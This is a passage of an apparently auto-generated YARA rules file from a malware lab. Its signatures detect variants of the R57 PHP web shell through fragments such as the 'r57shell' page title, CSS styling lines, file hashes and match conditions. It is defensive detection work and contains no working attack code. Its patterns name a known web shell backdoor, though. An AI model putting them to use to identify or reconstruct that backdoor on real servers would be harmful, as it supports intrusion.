      $s10 = "$lang=array(" fullword ascii /* score: '4.00'*/
      $s11 = "submit {" fullword ascii /* score: '4.00'*/
      $s12 = "echo \"</textarea></div>\";" fullword ascii /* score: '4.00'*/
      $s13 = "font: 8pt Verdana;" fullword ascii /* score: '4.00'*/
      $s14 = "width: 30%;" fullword ascii /* score: '4.00'*/
      $s15 = "echo \"<font face=Verdana size=-2 color=red><b>\";" fullword ascii /* score: '4.00'*/
      $s16 = "$aliases=array(" fullword ascii /* score: '4.00'*/
      $s17 = "echo \"</td><td>\";" fullword ascii /* score: '4.00'*/
      $s18 = "select {" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s19 = "input {" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0d20 ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_R57_Backdoor_PHP_R57_a_Backdoor_PHP_R57_5 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a, Backdoor.PHP.R57.a.c, Backdoor.PHP.R57.l"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "2140e87f6e60a6132c97f6fcb9ca32aeec0d00f564146139efb0c36ba555eb2e"
      hash2 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
      hash3 = "4bd10b983859a191da80b1fb49f8be389b1eb8ab0d1d90bd7e7b7f149445ebe7"
   strings:
      $s1 = "<title>r57shell</title>" fullword ascii /* score: '9.00'*/
      $s2 = "BORDER-BOTTOM: #aaaaaa 1px solid;" fullword ascii /* score: '4.00'*/
      $s3 = "BORDER-RIGHT:  #aaaaaa 1px solid;" fullword ascii /* score: '4.00'*/
      $s4 = "A:link {COLOR:red; TEXT-DECORATION: none}" fullword ascii /* score: '4.00'*/
      $s5 = "BACKGROUND-COLOR: #e4e0d8;" fullword ascii /* score: '4.00'*/
      $s6 = "A:visited { COLOR:red; TEXT-DECORATION: none}" fullword ascii /* score: '4.00'*/
      $s7 = "A:hover {color:blue;TEXT-DECORATION: none}" fullword ascii /* score: '4.00'*/
      $s8 = "BACKGROUND-COLOR: #D4D0C8;" fullword ascii /* score: '4.00'*/
      $s9 = "A:active {COLOR:red; TEXT-DECORATION: none}" fullword ascii /* score: '4.00'*/
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0d20 ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_R57_a_Backdoor_PHP_R57_Backdoor_PHP_R57_a_6 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a.b, Backdoor.PHP.R57.a, Backdoor.PHP.R57.a.c"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91c402e202f28a79730443cceb67a6bc1b093ca3cb2e5851cef52a79d1c716c3"
      hash2 = "2140e87f6e60a6132c97f6fcb9ca32aeec0d00f564146139efb0c36ba555eb2e"
      hash3 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
   strings:
      $s1 = "margin-left: 1px;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "margin-top: 1px;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "BORDER-BOTTOM: buttonhighlight 2px outset;" fullword ascii /* score: '4.00'*/
      $s4 = "BORDER-RIGHT:  buttonhighlight 2px outset;" fullword ascii /* score: '4.00'*/
      $s5 = "margin-right: 1px;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "margin-bottom: 1px;" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

